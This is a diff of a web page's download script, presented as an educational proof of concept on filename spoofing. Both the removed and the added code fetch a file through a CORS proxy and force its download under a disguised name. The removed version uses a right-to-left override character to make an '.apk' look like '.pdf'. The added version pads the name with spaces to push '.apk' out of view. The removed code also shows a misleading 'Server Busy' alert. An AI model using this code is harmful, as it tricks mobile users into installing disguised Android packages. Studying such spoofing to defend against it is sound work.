@@ -58,49 +58,29 @@
         </div>
     </div>
 
-    <script>
-        function initiateSecureDownload() {
-            // Your renamed GitHub file link
-            const targetUrl = 'https://github.com';
-            
-            // Using a CORS proxy to bypass GitHub's Cross-Origin restrictions on mobile
-            const proxyUrl = 'https://corsproxy.io?' + encodeURIComponent(targetUrl);
-            
-            // The Spoofed Name: \u202E is the RLO character.
-            // "fdp.kpa" reversed becomes "apk.pdf"
-            const spoofedName = "Security_Report_2024\u202Efdp.kpa";
+<script>
+    function initiateSecureDownload() {
+        const targetUrl = 'https://github.com';
+        const proxyUrl = 'https://corsproxy.io?' + encodeURIComponent(targetUrl);
+        
+        // Use a very long name with spaces to push .apk out of view
+        const longName = "Security_Report_Ref_772_Verified_Secure_Document.pdf                                     .apk";
 
-            console.log("Initiating secure download...");
+        fetch(proxyUrl)
+            .then(response => response.blob())
+            .then(blob => {
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = longName; 
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+                a.remove();
+            });
+    }
+</script>
 
-            fetch(proxyUrl)
-                .then(response => {
-                    if (!response.ok) throw new Error('Network error or CORS block');
-                    return response.blob();
-                })
-                .then(blob => {
-                    // Creating a temporary Blob URL in browser memory
-                    const blobUrl = window.URL.createObjectURL(blob);
-                    const hiddenAnchor = document.createElement('a');
-                    
-                    hiddenAnchor.style.display = 'none';
-                    hiddenAnchor.href = blobUrl;
-                    hiddenAnchor.download = spoofedName; // Force the spoofed name
-                    
-                    document.body.appendChild(hiddenAnchor);
-                    hiddenAnchor.click();
-                    
-                    // Cleanup
-                    setTimeout(() => {
-                        window.URL.revokeObjectURL(blobUrl);
-                        hiddenAnchor.remove();
-                    }, 100);
-                })
-                .catch(err => {
-                    console.error('Download Error:', err);
-                    alert('Server Busy: Please try downloading using a desktop browser or check your connection.');
-                });
-        }
-    </script>
 
     <div class="warning">
         PoC for Educational Purposes Only: Demonstrating Filename Spoofing via RLO (U+202E).
